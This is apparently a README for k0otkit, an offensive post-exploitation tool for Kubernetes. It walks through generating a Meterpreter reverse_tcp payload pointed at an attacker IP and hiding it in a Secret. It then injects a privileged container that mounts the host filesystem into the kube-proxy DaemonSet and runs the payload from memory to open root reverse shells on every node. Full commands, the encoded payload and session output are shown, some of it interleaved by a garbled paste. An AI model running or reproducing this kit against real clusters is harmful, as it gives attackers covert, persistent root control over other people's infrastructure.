# k0otkit - Manipulate K8s in a K8s way

## Introduction

k0otkit is a universal post-penetration technique which could be used in penetrations against Kubernetes clusters.

With k0otkit, you can manipulate all the nodes in the target Kubernetes cluster in a rapid, covert and continuous way (reverse shell).

k0otkit is the combination of **Kubernetes** and **rootkit**.

Prerequisite:

**k0otkit is a post-penetration tool, so you have to firstly conquer a cluster, somehow manage to escape from the container and get the root privilege of the master node (to be exact, you should get the admin privilege of the target Kubernetes).**

Scenario: 

1. After Web penetration, you get a shell of the target.
2. If necessary, you manage to escalate the privilege and make it.
3. You find the target environment is a container (Pod) in a Kubernetes cluster.
4. You manage to escape from the container and make it (with CVE-2016-5195, CVE-2019-5736, docker.sock or other techniques).
5. You get a root shell of the master node and are able to instruct the cluster with `kubectl` on the master node as `admin`.
6. Now you want to control all the nodes in the cluster as quickly as possible. **Here comes k0otkit!**

k0otkit is detailed in *[k0otkit: Hack K8s in a K8s Way](https://mp.weixin.qq.com/s/H48WNRRtlJil9uLt-O9asw)*.

## Usage

Make sure you have got the root shell on the master node of the target Kubernetes. (You can also utilize k0otkit if you have the admin privilege of the target Kubernetes, though you might need to modify the `kubectl` command in `k0otkit_template.sh` to use the token or certification.)

Make sure you have installed Metasploit on your attacker host (`msfvenom` and `msfconsole` should be available).

**Deploy k0otkit**

Clone this repository:

```bash
git clone https://github.com/brant-ruan/k0otkit
cd k0otkit/
chmod +x ./*.sh
```

Replace the attacker's IP and port in `pre_exp.sh` with your own IP and port:

```bash
ATTACKER_IP=192.168.1.107
ATTACKER_PORT=4444
```

Generate k0otkit:

```bash
./pre_exp.sh
```

`k0otkit.sh` will be generated. Then run the reverse shell handler:

```bash
./handle_multi_reverse_shell.sh
```

Once the handler is ready, copy the content of `k0otkit.sh` and paste it into your shell on the master node of the target Kubernetes, then press `<Enter>` to execute it.

Wait a moment and enjoy reverse shells from all nodes :)

P.S. It is not limited how many Kubernetes clusters you manipulate with k0otkit.

**Interact with Shells**

After the successful deployment of k0otkit, you can interact with any reverse shell as you want:

```bash
# within msfconsole
sessions 1
```

## Features

- utilize K8s resources and features (hack K8s in a K8s way)
- dynamic container injection
- communication encryption (thanks to Meterpreter)
- fileless

## Example

Generate k0otkit:

```
kali@kali:~/k0otkit$ ./pre_exp.sh
+ ATTACKER_IP=192.168.1.107
+ ATTACKER_PORT=4444
+ TEMP_MRT=mrt
+ msfvenom -p linux/x86/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.1.107 -f elf -o mrt
++ xxd -p mrt
++ tr -d '\n'
++ base64 -w 0
+ PAYLOAD=N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODEzZjM2ODAyMDAxMTVjODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw
+ sed s/PAYLOAD_VALUE_BASE64/N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODEzZjM2ODAyMDAxMTVjODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw/g k0otkit_template.sh
```

Run the reverse shell handler:

```
kali@kali:~/k0otkit$ ./handle_multi_reverse_shell.sh
payload => linux/x86/meterpreter/reverse_tcp
LHOST => 0.0.0.0
LPORT => 4444
ExitOnSession => false
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:4444
msf5 exploit(multi/handler) >
```

Copy the content of `k0otkit.sh` into your shell on the master node of the target Kubernetes and press `<Enter>`:

```
kali@kali:~$ nc -lvnp 10000
listening on [any] 10000 ...
connect to [192.168.1.107] from (UNKNOWN) [192.168.1.106] 48750
root@victim-2:~# volume_name=cache

mount_path=/var/kube-proxy-cache

ctr_name=kube-proxy-cache

binary_file=/usr/local/bin/kube-proxy-cache

payload_name=cache

secret_name=proxy-cache

secret_data_name=content

ctr_line_num=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | awk '/ containers:/{print NR}')

volume_line_num=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | awk '/ volumes:/{print NR}')

image=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | grep " image:" | awk '{print $2}')

# create payload secret
cat << EOF | kubectl --kubeconfig /root/.kube/config apply -f -
apiVersion: v1
kind: Secret
metadata:
  name: $secret_name
  namespace:volume_name=cache
root@victim-2:~#
root@victim-2:~# mount_path=/var/kube-p kube-system
type: Opaque
data:
  $secret_data_name: N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODEzZjM2ODAyMDAxMTVjODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw
EOF

# assume that ctr_line_num < volume_line_num
# otherwise you should switch the two sed commands below

# inject malicious container into kube-proxy pod
kubecroxy-cache
root@victim-2:~#
root@victim-2:~# ctr_name=kube-proxy-cache
root@victim-2:~#
root@victim-2:~# binary_file=/usr/local/bin/kube-proxy-cache
root@victim-2:~#
root@victim-2:~# payload_name=cache
root@victim-2:~#
root@victim-2:~# secret_name=proxy-cache
root@victim-2:~#
root@victim-2:~# secret_data_name=content
root@victim-2:~#
root@victim-2:~# ctr_line_num=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-tl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml \
  | sed "$volume_line_num a\ \ \ \ \ \ - name: $volume_name\n        hostPath:\n          path: /\n          type: Directory\n" \
  | sed "$ctr_line_num a\ \ \ \ \ \ - name: $ctr_name\n        image: $image\n        imagePullPolicy: IfNotPresent\n        command: [\"sh\"]\n        args: [\"-c\", \"echo \$$payload_name | perl -e 'my \$n=qq(); my \$fd=syscall(319, \$n, 1); open(\$FH, qq(>&=).\$fd); select((select(\$FH), \$|=1)[0]); print \$FH pack q/H*/, <STDIN>; my \$pid = fork(); if (0 != \$pid) { wait }; if (0 == \$pid){system(qq(/proc/\$\$\$\$/fd/\$fd))}'\"]\n        env:\n          - name: $payload_name\n            valueFrom:\n              secretKeyRef:\n          pr      name: $secret_name\n                key: $secret_data_name\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: $mount_path\n          name: $volume_name" \
containers:/{print NR}')oxy -o yaml | awk '/

root@victim-2:~#
root@victim-2:~# volume_line_num=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | awk '/ volumes:/{print NR}')
root@victim-2:~#
root@victim-2:~# image=$(kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml | grep " image:" | awk '{print $2}')
root@victim-2:~#
root@victim-2:~# # create payload secret
root@victim-2:~# cat << EOF | kubectl --kubeconfig /root/.kube/config apply -f -
> apiVersion: v1
> kind: Secret
> metadata:
>   name: $secret_name
>   namespace: kube-system
> type: Opaque
> data:
>   $secret_data_name: N2Y0NTRjNDYwMTAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMjAwMDMwMDAxMDAwMDAwNTQ4MDA0MDgzNDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAzNDAwMjAwMDAxMDAwMDAwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDA4MDA0MDgwMDgwMDQwOGNmMDAwMDAwNGEwMTAwMDAwNzAwMDAwMDAwMTAwMDAwNmEwYTVlMzFkYmY3ZTM1MzQzNTM2YTAyYjA2Njg5ZTFjZDgwOTc1YjY4YzBhODEzZjM2ODAyMDAxMTVjODllMTZhNjY1ODUwNTE1Nzg5ZTE0M2NkODA4NWMwNzkxOTRlNzQzZDY4YTIwMDAwMDA1ODZhMDA2YTA1ODllMzMxYzljZDgwODVjMDc5YmRlYjI3YjIwN2I5MDAxMDAwMDA4OWUzYzFlYjBjYzFlMzBjYjA3ZGNkODA4NWMwNzgxMDViODllMTk5YjI2YWIwMDNjZDgwODVjMDc4MDJmZmUxYjgwMTAwMDAwMGJiMDEwMDAwMDBjZDgw
> EOF
secret/proxy-cache created
root@victim-2:~#
root@victim-2:~# # assume that ctr_line_num < volume_line_num
root@victim-2:~# # otherwise you should switch the two sed commands below
root@victim-2:~#
root@victim-2:~# # inject malicious container into kube-proxy pod
root@victim-2:~# kubectl --kubeconfig /root/.kube/config -n kube-system get daemonsets kube-proxy -o yaml \
>   | sed "$volume_line_num a\ \ \ \ \ \ - name: $volume_name\n        hostPath:\n          path: /\n          type: Directory\n" \
>   | sed "$ctr_line_num a\ \ \ \ \ \ - name: $ctr_name\n        image: $image\n        imagePullPolicy: IfNotPresent\n        command: [\"sh\"]\n        args: [\"-c\", \"echo \$$payload_name | perl -e 'my \$n=qq(); my \$fd=syscall(319, \$n, 1); open(\$FH, qq(>&=).\$fd); select((select(\$FH), \$|=1)[0]); print \$FH pack q/H*/, <STDIN>; my \$pid = fork(); if (0 != \$pid) { wait }; if (0 == \$pid){system(qq(/proc/\$\$\$\$/fd/\$fd))}'\"]\n        env:\n          - name: $payload_name\n            valueFrom:\n              secretKeyRef:\n                name: $secret_name\n                key: $secret_data_name\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: $mount_path\n          name: $volume_name" \
>   | kubectl replace -f -
daemonset.extensions/kube-proxy replaced
```

Wait for reverse shells:

```
msf5 exploit(multi/handler) > [*] Sending stage (985320 bytes) to 192.168.1.106
[*] Meterpreter session 1 opened (192.168.1.107:4444 -> 192.168.1.106:51610) at 2020-11-30 03:30:18 -0500

msf5 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.168.1.106  192.168.1.107:4444 -> 192.168.1.106:51610 (192.168.1.106)
```

Function 1 Exit & Re-connect:

```
msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell
Process 9 created.
Channel 1 created.
whoami
root
exit
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.1.106 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(multi/handler) >
[*] Sending stage (985320 bytes) to 192.168.1.106
[*] Meterpreter session 2 opened (192.168.1.107:4444 -> 192.168.1.106:52292) at 2020-11-30 03:32:25 -0500
```

Function 2 Escape to & Control Node:

```
msf5 exploit(multi/handler) > sessions 2
[*] Starting interaction with 2...

meterpreter > cd /var/kube-proxy-cache
meterpreter > ls
Listing: /var/kube-proxy-cache
==============================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
40755/rwxr-xr-x   4096      dir   2020-03-03 03:21:08 -0500  bin
40755/rwxr-xr-x   4096      dir   2020-03-05 22:23:56 -0500  boot
40755/rwxr-xr-x   4180      dir   2020-04-09 21:32:10 -0400  dev
40755/rwxr-xr-x   4096      dir   2020-04-17 02:31:15 -0400  etc
40755/rwxr-xr-x   4096      dir   2020-03-03 03:00:00 -0500  home
100644/rw-r--r--  36257923  fil   2020-03-05 22:23:56 -0500  initrd.img
100644/rw-r--r--  39829184  fil   2020-03-03 03:00:17 -0500  initrd.img.old
40755/rwxr-xr-x   4096      dir   2020-04-16 03:52:46 -0400  lib
40755/rwxr-xr-x   4096      dir   2020-03-03 02:33:23 -0500  lib64
40700/rwx------   16384     dir   2020-03-03 02:33:19 -0500  lost+found
40755/rwxr-xr-x   4096      dir   2020-03-03 02:33:29 -0500  media
40755/rwxr-xr-x   4096      dir   2020-03-03 02:33:23 -0500  mnt
40755/rwxr-xr-x   4096      dir   2020-04-16 03:59:01 -0400  opt
40555/r-xr-xr-x   0         dir   2020-04-09 21:32:01 -0400  proc
40700/rwx------   4096      dir   2020-11-30 04:00:05 -0500  root
40755/rwxr-xr-x   1020      dir   2020-11-30 04:04:59 -0500  run
40755/rwxr-xr-x   12288     dir   2020-04-16 03:52:46 -0400  sbin
40755/rwxr-xr-x   4096      dir   2020-03-03 03:02:37 -0500  snap
40755/rwxr-xr-x   4096      dir   2020-03-03 02:33:23 -0500  srv
40555/r-xr-xr-x   0         dir   2020-04-14 22:51:06 -0400  sys
41777/rwxrwxrwx   4096      dir   2020-11-30 04:10:07 -0500  tmp
40755/rwxr-xr-x   4096      dir   2020-04-16 04:42:54 -0400  usr
40755/rwxr-xr-x   4096      dir   2020-03-03 02:51:25 -0500  var
100600/rw-------  6712336   fil   2020-03-05 22:22:58 -0500  vmlinuz
100600/rw-------  7184032   fil   2020-03-03 02:33:55 -0500  vmlinuz.old
```
